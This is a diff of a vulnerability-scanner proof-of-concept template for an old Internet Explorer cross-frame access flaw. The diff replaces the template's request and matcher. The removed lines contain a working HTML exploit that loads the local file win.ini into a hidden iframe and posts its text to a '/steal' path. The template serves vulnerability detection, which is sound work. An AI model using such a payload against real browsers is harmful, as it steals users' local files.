@@ -1,8 +1,8 @@
 [info]
 author = "AVE"
-description = "通过构造恶意HTML页面，利用IE浏览器DocumentComplete()事件处理函数未正确验证框架来源域，绕过同源策略读取客户端本地文件内容"
+description = "验证IE跨框架域验证漏洞：通过DocumentComplete()事件绕过同源策略，跨域读取客户端文件"
 id = "POC-AVE-2000-0387"
-name = "Microsoft Internet Explorer DocumentComplete Cross Frame Access PoC"
+name = "CVE-2000-0465 PoC"
 severity = "medium"
 tags = ["ave-2000-0387"]
 vuln_id = [
@@ -11,29 +11,18 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc.html"
+path = "/{{BaseURL}}/"
 protocol = "http"
-
-[poc.requests.body]
-content = """
-<html><body>
-<iframe id=clientContent width=0 height=0></iframe>
-<script for=clientContent event="DocumentComplete(browser)">
-var x = new XMLHttpRequest();
-x.open("POST", "/steal", false);
-x.setRequestHeader("Content-Type", "text/plain");
-x.send(browser.document.body.innerText);
-</script>
-<script>clientContent.navigate("file:///c:/windows/win.ini")</script>
-</body></html>"""
-type = "raw"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["CVE-2000-0465"]
+words = [
+    "<frame",
+    "<iframe",
+]
